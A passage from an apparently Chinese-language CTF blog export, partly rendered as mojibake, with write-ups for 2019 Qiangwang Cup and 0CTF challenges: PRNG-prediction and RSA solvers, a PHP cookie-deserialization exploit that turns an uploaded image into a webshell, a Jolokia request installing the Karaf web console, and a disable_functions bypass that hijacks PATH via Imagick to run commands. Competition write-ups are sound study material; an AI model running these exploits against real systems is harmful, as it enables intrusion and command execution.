class="line">r.recvuntil(<span class="string">&quot;.encode(&#x27;hex&#x27;)=&quot;</span>)</span><br><span class="line">part_hex=r.recv(<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span> hash_value,part_hex</span><br><span class="line">result=Pow(part_hex,hash_value)</span><br><span class="line">r.sendline(result)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;teamtoken:&#x27;</span>,token)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Generating challenge 1&#x27;</span>)</span><br><span class="line">base=<span class="built_in">int</span>(time.time())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge1</span>(<span class="params">base</span>):</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">random.seed(base)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>):</span><br><span class="line">data=random.randint(<span class="number">0</span>,<span class="number">2</span>**<span class="number">64</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;[-]&quot;</span>,timeout=<span class="number">1</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(data))</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;completed&quot;</span> <span class="keyword">in</span> r.recv():</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">base=base<span class="number">-1</span></span><br><span class="line">challenge1(base)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge2</span>():</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">r.recvuntil(<span class="string">&quot;[-]&quot;</span>)</span><br><span class="line">v1=r.recvuntil(<span class="string">&quot;\n&quot;</span>).strip()</span><br><span class="line">r.recvuntil(<span class="string">&quot;[-]&quot;</span>)</span><br><span class="line">v2=r.recvuntil(<span class="string">&quot;\n&quot;</span>).strip()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">o = subprocess.check_output([<span class="string">&quot;/usr/lib/jvm/jdk-12.0.1/bin/java&quot;</span>, <span class="string">&quot;ReplicatedRandom&quot;</span>,v1,v2])</span><br><span class="line">result=o.strip()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">result=<span class="string">&quot;123&quot;</span></span><br><span class="line">r.sendline(result)</span><br><span class="line">data=r.recv()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;123&quot;</span>+data</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;completed&quot;</span> <span class="keyword">in</span> r.recv():</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">challenge2()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge3</span>():</span></span><br><span class="line">predictor = MT19937Predictor()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">r.sendline(<span class="string">&quot;123&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;[+]failed:&quot;</span>)</span><br><span class="line">data=r.recvuntil(<span class="string">&quot;[-]&quot;</span>)</span><br><span class="line">predictor.setrandbits(<span class="built_in">int</span>(data[:<span class="number">-4</span>]), <span class="number">32</span>)</span><br><span class="line">result=predictor.getrandbits(<span class="number">32</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(result))</span><br><span class="line">r.recvuntil(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">challenge3()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="å¼ºç½‘å…ˆé”‹â€”â€”è¾…åŠ©"><a href="#å¼ºç½‘å…ˆé”‹â€”â€”è¾…åŠ©" class="headerlink" title="å¼ºç½‘å…ˆé”‹â€”â€”è¾…åŠ©"></a>å¼ºç½‘å…ˆé”‹â€”â€”è¾…åŠ©</h3><p>é€åˆ†é¢˜ï¼Œä¸¤ä¸ªnç®—æœ€å¤§å…¬å› æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n1=<span class="number">14967030059975114950295399874185047053736587880127990542035765201425779342430662517765063258784685868107066789475747180244711352646469776732938544641583842313791872986357504462184924075227433498631423289187988351475666785190854210389587594975456064984611990461126684301086241532915267311675164190213474245311019623654865937851653532870965423474555348239858021551589650169602439423841160698793338115204238140085738680883313433574060243600028500600824624358473403059597593891412179399165813622512901263380299561019624741488779367019389775786547292065352885007224239581776975892385364446446185642939137287519945974807727</span></span><br><span class="line">n2=<span class="number">14624662628725820618622370803948630854094687814338334827462870357582795291844925274690253604919535785934208081825425541536057550227048399837243392490762167733083030368221240764693694321150104306044125934201699430146970466657410999261630825931178731857267599750324918610790098952520113593130245010530961350592735239454337631927669542026935873535964487595433984902529960726655481696404006628917922241666148082741874033756970724357470539589848548704573091633917869387239324447730587545472564561496724882799495186768858324490838169123077051890332313671220385830444331578674338014080959653201802476516237464651809255679979</span></span><br><span class="line"></span><br><span class="line">p=gcd(n1,n2)</span><br><span class="line">q=n1/p</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="number">2482083893746618248544426737023750400124543452082436334398504986023501710639402060949106693279462896968839029712099336235976221571564642900240827774719199533124053953157919850838214021934907480633441577316263853011232518392904983028052155862154264401108124968404098823946691811798952747194237290581323868666637357604693015079007555594974245559555518819140844020498487432684946922741232053249894575417796067090655122702306134848220257943297645461477488086804856018323986796999103385565540496534422406390355987976815450744535949785073009043007159496929187184338592859040917546122343981520508220332785862546608841127597</span></span><br><span class="line">d=invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line"><span class="built_in">print</span> long_to_bytes(<span class="built_in">pow</span>(c,d,n1))</span><br></pre></td></tr></table></figure><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p><a href="http://www.tar.gz">www.tar.gz</a> æºç æ³„éœ²ã€‚ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ï¼Œå› ä¸ºåç¼€åæ˜¯pngä¸èƒ½è§£æï¼Œåˆ©ç”¨cookieååºåˆ—åŒ–ï¼ŒæŠŠå›¾ç‰‡é©¬å†™åˆ°phpåç¼€çš„æ–‡ä»¶é‡Œï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-f501656e75aeb6ad.png" alt="image.png"></p><p>è¿™é‡Œfilenameå¯æ§ï¼Œè°ƒç”¨upload_imgæ–¹æ³•å°±å¯ä»¥äº†ã€‚</p><p>æŠŠæºç æ‹–ä¸‹æ¥æ”¾åˆ°æœ¬åœ°webæ ¹ç›®å½•ï¼Œä¿®æ”¹index.phpï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $profile;</span><br><span class="line">    <span class="keyword">public</span> $profile_db;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;login_check())&#123;</span><br><span class="line">            $curr_url=<span class="string">&quot;http://&quot;</span>.$_SERVER[<span class="string">&#x27;HTTP_HOST&#x27;</span>].$_SERVER[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/home&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(<span class="string">&quot;index&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">home</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;login_check())&#123;</span><br><span class="line">            $curr_url=<span class="string">&quot;http://&quot;</span>.$_SERVER[<span class="string">&#x27;HTTP_HOST&#x27;</span>].$_SERVER[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/index&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;check_upload_img())&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;assign(<span class="string">&quot;username&quot;</span>,<span class="keyword">$this</span>-&gt;profile_db[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(<span class="string">&quot;upload&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;assign(<span class="string">&quot;img&quot;</span>,<span class="keyword">$this</span>-&gt;profile_db[<span class="string">&#x27;img&#x27;</span>]);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;assign(<span class="string">&quot;username&quot;</span>,<span class="keyword">$this</span>-&gt;profile_db[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(<span class="string">&quot;home&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $profile=cookie(<span class="string">&#x27;user&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($profile))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile=unserialize(base64_decode($profile));</span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile_db=db(<span class="string">&#x27;user&#x27;</span>)-&gt;where(<span class="string">&quot;ID&quot;</span>,intval(<span class="keyword">$this</span>-&gt;profile[<span class="string">&#x27;ID&#x27;</span>]))-&gt;find();</span><br><span class="line">            <span class="keyword">if</span>(array_diff(<span class="keyword">$this</span>-&gt;profile_db,<span class="keyword">$this</span>-&gt;profile)==<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_upload_img</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;profile) &amp;&amp; !<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;profile_db))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;profile_db[<span class="string">&#x27;img&#x27;</span>]))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        cookie(<span class="string">&quot;user&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        $curr_url=<span class="string">&quot;http://&quot;</span>.$_SERVER[<span class="string">&#x27;HTTP_HOST&#x27;</span>].$_SERVER[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/index&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$test = <span class="keyword">new</span> Profile();</span><br><span class="line">$test-&gt;checker = <span class="number">0</span>;</span><br><span class="line">$test-&gt;except = <span class="keyword">array</span>(<span class="string">&#x27;index&#x27;</span>=&gt;<span class="string">&#x27;upload_img&#x27;</span>);</span><br><span class="line">$test-&gt;ext = <span class="string">&#x27;php&#x27;</span>;</span><br><span class="line">$test-&gt;filename_tmp = <span class="string">&#x27;./upload/08856017fa6b6b422db719c5519123dc/8266e4bfeda1bd42d8f9794eb4ea0a13.png&#x27;</span>;</span><br><span class="line">$test-&gt;filename = <span class="string">&#x27;./upload/08856017fa6b6b422db719c5519123dc/gml.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$a=  <span class="keyword">new</span> Register();</span><br><span class="line">$a-&gt;checker = $test;</span><br><span class="line">$a-&gt;registed =<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">$exp = base64_encode(serialize($a));</span><br><span class="line">var_dump($exp);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è®¿é—®ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-d1fafcb9bd46afc5.png" alt="image.png"></p><p>cookieä¼ è¿‡å»ï¼Œå‘ç°å†™å…¥æˆåŠŸï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-a95ea999ec835bc5.png" alt="image.png"></p><p>getflagï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-dd607dade5421776.png" alt="image.png"></p><h3 id="å¼ºç½‘å…ˆé”‹â€”â€”ä¸Šå•"><a href="#å¼ºç½‘å…ˆé”‹â€”â€”ä¸Šå•" class="headerlink" title="å¼ºç½‘å…ˆé”‹â€”â€”ä¸Šå•"></a>å¼ºç½‘å…ˆé”‹â€”â€”ä¸Šå•</h3><p>åœ¨logé‡Œå‘ç°payloadï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-fb215a37964b3de4.png" alt="image.png"></p><p>æ‰“ä¸€ä¸‹ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-1e6ebac53b27142c.png" alt="image.png"></p><p>getflag:</p><p><img src="/2019/05/27/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF-wp/C:%5CUsers%5C43575%5CAppData%5CLocal%5CTemp%5C1558881058312.png" alt="1558881058312"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 0CTF</title>
      <link href="/2019/03/28/2019-0CTF/"/>
      <url>/2019/03/28/2019-0CTF/</url>
      
        <content type="html"><![CDATA[<p>æœç„¶ 0CTF æ˜¯ä¸ºç¥ä»™å‡†å¤‡çš„ï¼Œè‡ªé—­äº†ã€‚</p><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="Ghost-Pepper"><a href="#Ghost-Pepper" class="headerlink" title="Ghost Pepper"></a>Ghost Pepper</h4><a id="more"></a><p>Java Web æ²¡æ€ä¹ˆæ¥è§¦è¿‡ï¼Œåˆ©ç”¨è¿™æ¬¡å­¦ä¹ ä¸€ä¸‹ã€‚</p><p>å‚è€ƒï¼š</p><ol><li><a href="http://momomoxiaoxi.com/2019/03/26/tctf2019/#ghost-pepper">http://momomoxiaoxi.com/2019/03/26/tctf2019/#ghost-pepper</a></li><li><a href="https://blog.csdn.net/like98k/article/details/88797218">https://blog.csdn.net/like98k/article/details/88797218</a></li></ol><p>è¿›å»å‘ç°è¦ç™»å½•ï¼Œç”¨ chrome çœ‹ä¸å‡ºï¼Œæ‹¿ firefoxå¯ä»¥çœ‹åˆ°æç¤ºï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-a8de5797085db37e.png" alt="image.png"></p><p>karaf/karaf ç™»å½•è¿›å»ï¼Œå‘ç°ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Œçœ‹åˆ°æ˜¯ Jettyï¼Œå‘ç°æœ‰ Jolokiaï¼Œæœæ¼æ´ã€‚ </p><p>æ¯”è¾ƒç®€å•çš„ä¸€ç§åšæ³•æ˜¯ karaf æœ‰ä¸€ä¸ª webconsoleï¼Œæˆ‘ä»¬å¯ä»¥å®‰è£…ä¸€ä¸ªè¿›æ§åˆ¶å°æ‹¿ flagã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/jolokia/exec</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 111.186.63.207:31337</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Authorization</span>: Basic a2FyYWY6a2FyYWY=</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: text/plain</span><br><span class="line"><span class="attribute">Content-Length</span>: 150</span><br><span class="line"></span><br><span class="line">&#123;  &quot;mbean&quot;: &quot;org.apache.karaf:name=root,type=feature&quot;,  &quot;operation&quot;: &quot;installFeature(java.lang.String)&quot;,  &quot;type&quot;: &quot;EXEC&quot;,  &quot;arguments&quot;:[&quot;webconsole&quot;]&#125;</span><br></pre></td></tr></table></figure><p>è®¿é—® <code>http://111.186.63.207:31337/system/console/gogo</code></p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-805d6c483fdf6cf2.png" alt="image.png"></p><p>å¦ä¸€ç§æ˜¯é€šè¿‡osgi.core çš„ installBundleFromURL æ¥å®‰è£…bundleï¼Œè¿™éƒ¨åˆ†å¯ä»¥å‚è€ƒ@moxiaoxiçš„wpã€‚</p><h4 id="Wallbreaker-Easy"><a href="#Wallbreaker-Easy" class="headerlink" title="Wallbreaker Easy"></a>Wallbreaker Easy</h4><p>èµ›åçœ‹å„ä½å¤§å¸ˆå‚…ä»¬çš„ wpï¼ŒåŸºæœ¬éƒ½æ˜¯é€šè¿‡å¯ç”¨æ–°çš„è¿›ç¨‹æ¥è°ƒç”¨ soï¼Œsoæ–‡ä»¶æˆ‘ä»¬å¯æ§å¹¶é€šè¿‡ä¿®æ”¹<code>LD_PRELOAD</code>  æ–¹å¼åŠ è½½æ¥æ‰§è¡Œå‘½ä»¤ã€‚è¿™é‡Œè´´ä¸Šå‡ ä¸ªé“¾æ¥ã€‚</p><ol><li><a href="https://xz.aliyun.com/t/4589">https://xz.aliyun.com/t/4589</a></li><li><a href="http://momomoxiaoxi.com/2019/03/26/tctf2019/">http://momomoxiaoxi.com/2019/03/26/tctf2019/</a></li><li><a href="https://paper.tuisec.win/detail/d4ba64dd4d1dc38">https://paper.tuisec.win/detail/d4ba64dd4d1dc38</a></li></ol><p>ä»¥åŠæŸ æª¬å¸ˆå‚…çš„<code>bypass disable_functions</code>çš„ <a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell">æ€»ç»“</a>ã€‚</p><p>æ­¤å¤–è¿˜çœ‹åˆ°äº†ä¸€ç§çªç ´ <code>open_basedir</code>ï¼Œä»è€Œè¯»åˆ«äººç›®å½•ä¸‹ flag çš„æ“ä½œï¼š<a href="https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#wallbreaker-easy">https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#wallbreaker-easy</a></p><p>è¿˜æœ‰ä¸€ç§è§£æ³•ç›¸æ¯”åŠ«æŒå‡½æ•°ç®€å•ä¸€äº›ã€‚åœ¨è°ƒç”¨ Imagick å°† pngã€bmpç­‰æ ¼å¼çš„æ–‡ä»¶è½¬æˆ jxr ç±»å‹æ—¶ï¼Œä¼šè°ƒç”¨ç³»ç»ŸPATH è·¯å¾„ä¸‹çš„ <code>JxrEncApp</code>æ¥è¿›è¡Œè½¬æ¢ã€‚<a href="https://stackoverflow.com/questions/22235227/imagemagick-convert-png-to-jxr">å‚è€ƒ</a></p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ <code>putenv</code> æŠŠ PATH æ”¹åˆ°è‡ªå·±çš„ tmp è·¯å¾„ä¸‹ï¼ŒæŠŠè¦æ‰§è¡Œçš„å‘½ä»¤å†™åˆ°è¯¥è·¯å¾„ä¸‹çš„ <code>JxrEncApp</code>é‡Œï¼Œè¿™æ ·æˆ‘ä»¬åœ¨è½¬æ¢çš„æ—¶å€™å°±å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤äº†ã€‚</p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span>=<span class="string">&quot;/tmp/2204d9af0488be704281eca42608c464&quot;</span></span><br><span class="line">exploit_php = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;pre&gt;</span></span><br><span class="line"><span class="string">Open Basedir: &lt;br&gt;&lt;?php echo ini_get(&#x27;open_basedir&#x27;);?&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">Disable functions: &lt;br&gt;&lt;?php echo ini_get(&#x27;disable_functions&#x27;); ?&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$tmp = &quot;%s&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">file_put_contents(&quot;$tmp/1.bmp&quot;, file_get_contents(&quot;http://www.humanesociety.org/sites/default/files/2018/06/cat-217679.jpg&quot;));</span></span><br><span class="line"><span class="string">$exp = &lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">#!/bin/bash</span></span><br><span class="line"><span class="string">/readflag &gt; $tmp/data</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">file_put_contents(&quot;$tmp/JxrEncApp&quot;, $exp);</span></span><br><span class="line"><span class="string">chmod(&quot;$tmp/JxrEncApp&quot;, 0777);</span></span><br><span class="line"><span class="string">putenv(&quot;PATH=$tmp:/usr/sbin:/usr/bin:/bin&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">try &#123;</span></span><br><span class="line"><span class="string">    $a = new Imagick();</span></span><br><span class="line"><span class="string">    $a-&gt;readImage(&quot;$tmp/1.bmp&quot;);</span></span><br><span class="line"><span class="string">    $a-&gt;writeImage(&quot;$tmp/1.jxr&quot;);</span></span><br><span class="line"><span class="string">&#125; catch (Exception $e) &#123;</span></span><br><span class="line"><span class="string">var_dump($e);</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">&lt;br&gt;</span></span><br><span class="line"><span class="string">Command output:</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">echo file_get_contents(&quot;$tmp/data&quot;);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">&lt;/pre&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>% <span class="built_in">dir</span></span><br><span class="line">gadget_code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">file_put_contents(&quot;%s/gml&quot;, base64_decode(&quot;%s&quot;));</span></span><br><span class="line"><span class="string">include &quot;%s/gml&quot;;</span></span><br><span class="line"><span class="string">unlink(&quot;%s/gml&quot;);</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>% (<span class="built_in">dir</span>,base64.b64encode(exploit_php),<span class="built_in">dir</span>,<span class="built_in">dir</span>)</span><br><span class="line">print(requests.post(<span class="string">&quot;http://111.186.63.208:31340&quot;</span>, data=&#123;<span class="string">&#x27;backdoor&#x27;</span>: gadget_code &#125;).content)</span><br></pre></td></tr></table></figure><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><p>0CTFçš„ Crypto æŠ¬æ‰‹å°±æ˜¯è®ºæ–‡ï¼ŒçœŸå®ã€‚</p><h4 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h4><p>pubkey.py ä¸­å‘ç° RSA çš„å…¬é’¥ e=31337ï¼Œè€Œ N æ˜¯ä¸ªå¤šé¡¹å¼ã€‚</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-809ce9413e637f1e.png" alt="image.png"></p><p>rsa.sage:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 